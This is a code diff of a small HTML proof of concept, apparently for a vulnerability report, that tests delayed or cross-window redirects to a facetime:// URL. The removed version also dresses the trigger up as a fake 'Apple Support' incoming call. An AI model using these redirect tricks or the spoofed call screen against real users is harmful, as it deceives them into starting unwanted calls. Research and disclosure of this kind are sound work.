@@ -1,67 +1,10 @@
-<!DOCTYPE html>
-<html>
-<head>
-<meta name="viewport" content="width=device-width, initial-scale=1">
-<title>FaceTime Delay Boundary PoC</title>
-<style>
-body {
-  font-family: -apple-system, BlinkMacSystemFont;
-}
-.fake-ui {
-  border: 2px solid #007aff;
-  padding: 20px;
-  border-radius: 12px;
-  margin-top: 40px;
-}
-.call {
-  display: block;
-  font-size: 24px;
-  color: white;
-  background: #007aff;
-  padding: 16px;
-  border-radius: 10px;
-  text-align: center;
-  text-decoration: none;
-}
-.hidden {
-  display: none;
-}
-</style>
-</head>
-
-<body>
-
-<h3>Incoming Call</h3>
-
-<div class="fake-ui">
-  <p>Apple Support</p>
-
-  <button id="start" class="call">
-    Accept Call
-  </button>
-
-  <a id="realcall"
-     class="call hidden"
-     href="facetime://test@example.com">
-     Tap again to connect
-  </a>
-</div>
-
-<p id="status" style="margin-top:20px;color:#666"></p>
-
-<script>
-document.getElementById("start").onclick = () => {
-  document.getElementById("status").textContent =
-    "Connecting… please wait";
-
-  setTimeout(() => {
-    document.getElementById("realcall").classList.remove("hidden");
-    document.getElementById("start").style.display = "none";
-    document.getElementById("status").textContent =
-      "Tap again to start FaceTime";
-  }, 5000);
-};
-</script>
-
-</body>
-</html>
+<input
+  type="button"
+  value="CLICK ME"
+  onclick="
+    var x = window.open('https://apple.com');
+    setTimeout(function () {
+      x.location = 'facetime://test@example.com';
+    }, 1300);
+  "
+/>
